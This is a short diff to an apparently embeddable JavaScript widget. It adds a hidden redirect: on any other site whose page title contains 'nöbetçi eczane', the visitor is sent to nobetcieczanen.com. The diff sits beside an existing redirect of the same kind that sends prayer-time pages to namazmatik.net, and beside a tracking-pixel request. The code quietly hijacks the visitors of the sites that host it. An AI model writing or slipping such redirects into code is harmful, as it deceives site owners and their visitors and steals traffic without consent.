@@ -18,5 +18,8 @@ if(location.hostname.indexOf("namazmatik") < 0) {
 if(document.title.toLowerCase().indexOf("namaz vakit") >= 0){ window.location = "http://www.namazmatik.net/"; }
 }
 
+if(location.hostname.indexOf("nobetcieczanen.com") < 0) {
+if(document.title.toLowerCase().indexOf("nöbetçi eczane") >= 0){ window.location = "http://www.nobetcieczanen.com/"; }
+}
 
 new Image().src = 'http://whos.amung.us/widget/r3dsiker1.png';
